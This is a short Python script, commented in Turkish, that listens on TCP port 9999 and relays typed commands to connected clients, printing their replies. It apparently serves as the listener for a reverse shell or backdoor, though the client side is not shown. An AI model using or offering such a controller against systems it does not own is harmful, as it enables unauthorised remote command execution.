import socket
import threading

def handle_client(client_socket):
    while True:
        try:
            command = input("Komut girin: ")
            if command == "exit":
                client_socket.send(command.encode())
                client_socket.close()
                break
            client_socket.send(command.encode())
            response = client_socket.recv(4096).decode()
            print(response)
        except Exception as e:
            print(f"Bağlantı kesildi: {e}")
            client_socket.close()
            break

def server_loop():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("Sunucu dinlemede...")

    while True:
        client_socket, addr = server.accept()
        print(f"Bağlandı: {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

server_loop()
